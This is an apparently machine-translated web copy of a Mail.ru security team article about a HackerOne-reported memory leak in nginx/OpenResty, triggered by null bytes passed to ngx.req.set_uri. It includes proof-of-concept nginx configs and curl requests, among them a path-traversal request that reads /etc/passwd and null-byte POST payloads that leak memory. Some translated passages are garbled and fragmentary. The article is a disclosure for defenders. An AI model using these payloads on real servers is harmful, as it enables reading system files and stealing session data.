<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üëâüèº üîÜ üóùÔ∏è About one vulnerability in ... ü¶é üö∫ üì∑</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="A year ago, March 21, 2019, in a bug bounty program Mail.ru on HackerOne came a very good bug report from maxarr . When embedding a zero byte (ASCII 0...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>About one vulnerability in ...</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/mailru/blog/493920/"><img src="https://habrastorage.org/webt/du/k3/h5/duk3h5leha8sz3qinzb3g_8yfsk.jpeg"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A year ago, March 21, 2019, in </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">a bug bounty program Mail.ru</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> on HackerOne came a very good </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">bug report</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> from </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">maxarr</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . When embedding a zero byte (ASCII 0) in the POST parameter of one of the webmail API requests that returned an HTTP redirect, pieces of uninitialized memory were seen in the redirect data, in which fragments from GET parameters and headers of other requests to the same server.</font></font><br>
<a name="habracut"></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
This is a critical vulnerability because requests include session cookies. A few hours later, a temporary fix was made, which filtered a zero byte (as it turned out later, this was not enough, because there was the possibility of injecting CRLF / ASCII 13, 10, which allows you to manipulate the headers and data of the HTTP response, this is less critical, but still unpleasant). At the same time, the problem was referred to security analysts and developers to find and eliminate the causes of the bug.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mail.ru mail is a very complicated application, a large number of different front-end / back-end components, both open source (many thanks to all free software developers) and our own development, can participate in the response. It was possible to exclude all components except nginx and openresty and localize the problem before calling </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ngx.req.set_uri ()</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">in an OpenResty script that did not behave as expected (stick a zero byte or line feed through GET parameters from rewrite to ngx_http_rewrite_module, which, according to the documentation, is used and, it would seem, should work absolutely the same way). Possible consequences were eliminated, the most strict filtering was added, and it was verified that filtering eliminates all possible vectors. But the mechanism that led to the leak of memory contents remained a mystery. A month later, the bugreport was closed as authorized, and the analysis of the causes of the bug was postponed until better times.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
OpenResty is a very popular plugin that allows you to write Lua scripts inside nginx, and it is used in several Mail.ru projects, so the problem was not considered resolved. And after some time, they nevertheless returned to her to understand the true causes, possible consequences and make recommendations for developers. The source code was excavated by </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Denis Denisov</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> and </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nikolai Ermishkin</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . It turned out that:</font></font><br>
<br>
<ul>
<li> nginx   rewrite      directory traversal (  SSRF)   ,    ,         <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=">Nginx Amplify</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=">Gixy</a>   (,    , ).   OpenResty    ,      .<br>
<br>
 :<br>
<br>
<pre><code class="nginx hljs"><span class="hljs-attribute">location</span> <span class="hljs-regexp">~ /rewrite</span> {
    <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^.*$</span> <span class="hljs-variable">$arg_x</span>;<font></font>
}<font></font>
<font></font>
<span class="hljs-attribute">location</span> / {
    <span class="hljs-attribute">root</span> html;
    <span class="hljs-attribute">index</span> index.html index.htm;<font></font>
}</code></pre><br>
<br>
<br>
<br>
<code>curl localhost:8337/rewrite?x=/../../../../../../../etc/passwd<br>
root:x:0:0:root:/root:/bin/bash<br>
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>
bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>
...</code><br>
<br>
</li>
<li> nginx  ,     ,   rewrite   .    nginx    ,    ,       ,       ,       ,     .     <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="></a>.<br>
<br>
  (^@  )<br>
<pre><code class="nginx hljs">
<span class="hljs-attribute">location</span> <span class="hljs-regexp">~ /memleak</span> {
    <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^.*$</span> <span class="hljs-string">"^<span class="hljs-variable">@asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdasdf</span>"</span>;<font></font>
}<font></font>
<font></font>
<span class="hljs-attribute">location</span> / {
    <span class="hljs-attribute">root</span> html;
    <span class="hljs-attribute">index</span> index.html index.htm;<font></font>
}</code></pre><br>
<br>
<br>
<code>curl localhost:8337/secret -vv<br>
...<br>
curl localhost:8337/memleak -vv<br>
...<br>
Location: http://localhost:8337/secret<br>
...<br>
</code><br>
</li>
<li>Nginx  GET-          rewrite  GET-.         nginx  . POST     . OpenResty     GET   POST ,    POST   OpenResty     .<br>
<br>
 :<br>
<br>
<pre><code class="nginx hljs"><span class="hljs-attribute">location</span> <span class="hljs-regexp">~ /memleak</span> {
    <span class="hljs-section">rewrite_by_lua_block</span> {<font></font>
        ngx.req.read_body();<font></font>
        <span class="hljs-attribute">local</span> args, err = ngx.req.get_post_args();<font></font>
        ngx.req.set_uri( args["url"], <span class="hljs-attribute">true</span> );<font></font>
    }<font></font>
}<font></font>
<font></font>
<span class="hljs-attribute">location</span> / {
    <span class="hljs-attribute">root</span> html;
    <span class="hljs-attribute">index</span> index.html index.htm;<font></font>
}<font></font>
</code></pre><br>
<br>
:<br>
<br>
<code>curl localhost:8337 -d "url=secret" -vv<br>
...<br>
curl localhost:8337 -d "url=%00asdfasdfasdfasdfasdfasdfasdfasdf" -vv<br>
...<br>
Location: http://localhost:8337/{...  secret...}<br>
...<br>
</code><br>
</li>
</ul><br>
<h4> </h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
The problem was reported to nginx and OpenResty developers, the developers do not consider the problem as a security error in nginx, because in nginx itself there is no way to exploit the error through the injection of special characters, the fix for </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">revealing the contents of the memory</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> was published on December 16. In the 4 months since the report, no changes were made to OpenResty, although there was an understanding that a safe version of the ngx.req.set_uri () function was needed. On March 18, 2020, we published the information; on March 21, OpenResty released </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">version 1.15.8.3</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , which adds a URI check. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Portswigger </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wrote</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> I took a good article from OpenResty and Nginx (though the comment that only a small piece of memory is revealed is incorrect and misleading, this is determined by the length of the line following the zero byte and, in the absence of obvious length restrictions, can be controlled by the attacker).</font></font><br>
<br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">So what was the mistake and what to do to prevent it?</font></font></h4><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was there an error in nginx?</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Yes, it was, because a memory leak is an error anyway. </font></font><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Was there an error in OpenResty?</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Yes, at least the issue of security of the functionality offered by OpenResty has not been investigated and documented. </font></font><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Has an OpenResty configuration / use error been made?</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Yes, because in the absence of an explicit indication, an unverified assumption was made about the safety of the functionality used. </font></font><br>
 <br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Which of these errors is a $ 10,000 bounty security vulnerability?</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">For us, this is generally not important. </font><font style="vertical-align: inherit;">In any software, especially at the junction of several components, especially those provided by different projects and developers, no one can ever guarantee that all the features of their work are known and documented and that there are no errors. </font><font style="vertical-align: inherit;">Therefore, any security vulnerability arises exactly where it affects security. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In any case, it is good practice to normalize or to limit / filter the input data, which goes to any external module / API, if there are no explicit indications and an unambiguous understanding that this is not required.</font></font><br>
<br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Errata</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
According to the experience </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">of the previous article</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , in order to preserve the purity of the language: </font></font><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">a bug bounty</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - hunting competition for bugs </font></font><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">bug report</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - error notification </font></font><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">redirect</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - redirect </font></font><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">opensorsny</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - open source </font></font><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">known as errata</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - work on the bugs</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../en493898/index.html">"Where do legs grow from" or what precedes programming?</a></li>
<li><a href="../en493904/index.html">How to lose confidence in AI, or how I bullied with Gradient Photo Editor</a></li>
<li><a href="../en493906/index.html">Toxic Windows shortcuts: an old artifact not forgotten by hackers, but partially forgotten by forensics</a></li>
<li><a href="../en493914/index.html">Web2Text: deep structured extraction of web page content</a></li>
<li><a href="../en493918/index.html">How the pandemic affected VPN providers</a></li>
<li><a href="../en493922/index.html">Glasses of twilight vision. Android Camera2 API from the Maker Part 5 Flash</a></li>
<li><a href="../en493924/index.html">Stop the conveyor! You give Epson XGA projectors at the price of SVGA</a></li>
<li><a href="../en493926/index.html">Tricks to Test Laravel Web Applications Using Model Factories</a></li>
<li><a href="../en493928/index.html">Review and testing Huawei Dorado 5000V6</a></li>
<li><a href="../en493932/index.html">Overview of Google Surveys. Why it is not suitable for serious research</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>